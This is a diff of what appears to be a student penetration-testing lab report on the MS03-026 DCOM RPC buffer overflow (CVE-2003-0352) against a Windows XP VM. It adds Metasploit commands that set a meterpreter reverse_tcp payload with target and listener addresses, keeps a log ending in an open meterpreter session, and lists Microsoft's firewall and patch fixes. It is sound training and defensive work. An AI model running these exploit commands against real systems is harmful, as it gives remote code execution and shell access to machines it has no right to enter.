@@ -1,5 +1,35 @@
 https://cyruslab.net/2012/03/06/metasploit-gaining-remote-access-to-windows-xp/
 
+Potential Vulnerability:
+	
+	PORT: 135
+	CVE: CVE-2003-0352
+	DESCRIPTION:  Buffer overflow in a certain DCOM interface for RPC in Microsoft Windows NT 4.0, 2000, XP, and Server 			  2003 allows remote attackers to execute arbitrary code via a malformed message, as exploited by the 			      Blaster/MSblast/LovSAN and Nachi/Welchia worms.	
+	IMPACT: Run code of attacker's choice
+
+Two possibilities, either it is exploitable or not.
+Fill out below as appropriate.
+
+The system is exploitable:
+	B: Below is an MSF script to exploit it
+
+		set PAYLOAD windows/meterpreter/reverse_tcp
+		set RHOST 192.168.0.33
+		set LHOST 192.168.0.129
+		exploit
+
+	C: Below explain ways one fixes the VM. 
+
+		There is two options for preventing this issue according to microsoft.
+		1. Block UDP ports 135, 137, 138, 445 and TCP ports 135, 139, 445, 593 at your firewall and disable
+		COM Internet Services (CIS) and RPC over HTTP 
+		2. Can patch on Windows XP Gold or Service Pack 1.
+			(https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-026)
+		
+		
+MetaSploit Log
+====================================================================================================================
+
 
 msf exploit(ms03_026_dcom) > SET PAYLOAD windows/meterpreter/reverse_tcp
 [-] Unknown command: SET.
@@ -28,45 +58,5 @@ Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/windows
 meterpreter >
-
-
-Potential Vulnerability:
-
-	DESCRIPTION, CVE, PORT etc. GOES HERE
-
-Two possibilities, either it is exploitable or not.
-Fill out below as appropriate.
-
-The system is exploitable:
-	A: I can't seem to find a way to exploit it using MSF.
-
-		SHOW THAT YOU TRIED
-
-	B: Below is an MSF script to exploit it
-
-		YOUR SCRIPT GOES HERE
-
-	C: Below explain ways one fixes the VM. 
-
-		YOUR EXPLANATION GOES HERE
-
-The system is not exploitable, explain why the system is not exploitable
-by filling in the following as appropriate:
-
-	A: There is no known vulnerability
-
-		EXPLAIN HOW YOU KNOW
-
-	B: There appears to be a vulnerability, 
-		but the system is configured to mitigate
-		against it.
-
-		EXPLAIN, SHOW THE CONFIG/MITIGATION
-
-	C: Some versions of the service are vulnerable, this one is not. 
-
-		I searched: YOUR ANSWER HERE (PROVIDE LINKS)
-
-		Vulnerable versions include: YOUR ANSWER HERE (LINKS)
-
-		The system is using version: YOUR ANSWER HERE (HOW DID YOU FIND THIS)
+		
+		
